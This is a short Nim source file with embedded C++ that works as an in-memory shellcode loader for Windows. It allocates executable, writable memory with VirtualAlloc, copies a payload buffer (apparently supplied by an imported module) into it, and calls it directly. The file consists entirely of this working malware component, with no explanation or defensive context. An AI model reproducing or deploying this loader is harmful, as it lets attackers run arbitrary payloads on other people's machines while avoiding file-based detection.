import public

{.emit: """
#include <windows.h>
#include <iostream>
#include <iomanip>


int Direct_Load(char *shellcode,SIZE_T shellcodeSize)
{
  LPVOID Memory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, shellcode, shellcodeSize);
	((void(*)())Memory)();
	return 0;
}
""".}

proc Direct_Load(plainBuffer:cstring,size:cint):cint {.importcpp:"Direct_Load(@)",nodecl.}

discard Direct_Load(code,codelen)
